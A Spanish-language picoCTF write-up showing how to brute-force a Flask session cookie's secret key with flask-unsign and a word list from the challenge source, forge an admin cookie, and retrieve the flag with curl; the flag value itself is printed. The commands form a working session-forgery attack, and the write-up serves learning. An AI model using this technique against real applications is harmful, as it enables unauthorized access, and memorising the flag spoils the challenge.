### Descripcion
Alright, enough of using my own encryption. Flask session cookies should be plenty secure! [server.py](https://mercury.picoctf.net/static/cae5577e6b8f86e17d7884723204f61e/server.py) [http://mercury.picoctf.net:6259/](http://mercury.picoctf.net:6259/)
### Solucion
Primero analizamos el código python que nos proporcionan y vemos que hay un diccionario con las cookies que usan para firmar la cookie
```python
["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
```
Ponemos estas cookies en un archivo separadas por un salto de linea
```
snickerdoodle  
chocolate chip  
oatmeal raisin  
gingersnap  
shortbread  
peanut butter  
whoopie pie  
sugar  
molasses  
kiss  
biscotti  
butter  
spritz  
snowball  
drop  
thumbprint  
pinwheel  
wafer  
macaroon  
fortune  
crinkle  
icebox  
gingerbread  
tassie  
lebkuchen  
macaron  
black and white  
white chocolate macadamia
```
Despues instalamos la herramienta de flask-unsign para poder ver con cual cookie se firmo la cookie de flask.
Para esto vamos a usar un entorno virtual de python
```
python -m venv ~/.venv  

source ~/.venv/bin/activate 

python3 -m pip install flask-unsign
```
Entonces ya con esto realizamos el ataque con fuerza bruta para ver con que se firmo la cookie
```bash
❯ flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.aBreaQ.WPRa9JnUWtt9pexwMLHlJQ8O3fQ" --wordlist cookies.txt
[*] Session decodes to: {'very_auth': 'snickerdoodle'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'gingersnap'
❯ flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret "gingersnap"
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.aBrgbQ.f9B2vAMpOVPQs-kYDUxeVESyxok
```
Despues hacemos un curl con la cookie y tendremos la bandera 
```bash
❯ curl -s http://mercury.picoctf.net:6259/display -H "Cookie: session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.aBrgbQ.f9B2vAMpOVPQs-kYDUxeVESyxok" | grep picoCTF

            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{pwn_4ll_th3_cook1E5_5f016958}</code></p>
```
### Tags
